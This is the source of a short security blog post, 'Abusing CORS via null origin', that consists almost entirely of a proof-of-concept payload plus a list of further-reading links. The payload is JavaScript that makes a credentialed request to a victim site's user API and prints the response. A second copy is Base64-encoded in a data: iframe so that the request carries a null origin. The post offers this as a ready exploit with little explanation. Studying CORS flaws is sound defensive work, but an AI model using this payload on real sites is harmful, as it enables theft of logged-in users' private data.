---
layout: post
title: Abusing CORS via null origin
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - onehackzero</p>

## POC:

{% highlight javascript %}
<script>
    var url = "https://www.victim.com/api/getuser";
    var req = new XMLHttpRequest();
    req.open('get',url,true);
    req.setRequestHeader("Accept", "application/json");
    req.withCredentials = true;
    req.send();
    req.onreadystatechange= function(){
    if(req.readyState == req.DONE) {
        document.write(this.responseText)
    }}
 </script>
{% endhighlight %}

This code was converted to the equivalent Base64 string.

{% highlight javascript %}
<iframe width=100% height=100% src="data:text/html;base64,PHNjcmlwdD4gdmFyIHVybCA9ICJodHRwczovL3d3dy52aWN0aW0uY29tL2FwaS9nZXR1c2VyIjsgIHZhciByZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtyZXEub3BlbignZ2V0Jyx1cmwsdHJ1ZSk7cmVxLnNldFJlcXVlc3RIZWFkZXIoIkFjY2VwdCIsICJhcHBsaWNhdGlvbi9qc29uIik7cmVxLndpdGhDcmVkZW50aWFscyA9IHRydWU7cmVxLnNlbmQoKTtyZXEub25yZWFkeXN0YXRlY2hhbmdlPSBmdW5jdGlvbigpe2lmKHJlcS5yZWFkeVN0YXRlID09IHJlcS5ET05FKSB7ZG9jdW1lbnQud3JpdGUodGhpcy5yZXNwb25zZVRleHQpfSB9PC9zY3JpcHQ+">
{% endhighlight %}

## Further reading:

<a href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank">Exploiting CORS misconfigurations for Bitcoins and bounties</a><br>
<a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/" target="_blank">Exploiting Misconfigured CORS (Cross Origin Resource Sharing)</a><br>
<a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-via-wildcard-subdomains" target="_blank">Exploiting Misconfigured CORS via Wildcard Subdomains</a><br>
<a href="https://web-in-security.blogspot.com/2017/07/cors-misconfigurations-on-large-scale.html" target="_blank">CORS misconfigurations on a large scale</a><br>
<a href="https://yassineaboukir.com/blog/cors-exploitation-data-exfiltration-when-allowed-origin-is-set-to-null/" target="_blank">CORS Exploitation: Data exfiltration when allowed origin is set to NULL</a><br>
<a href="https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/" target="_blank">CORS Misconfigurations Explained</a><br>
<a href="https://www.sxcurity.pro/advanced-cors-techniques/" target="_blank">Advanced CORS Exploitation Techniques</a><br>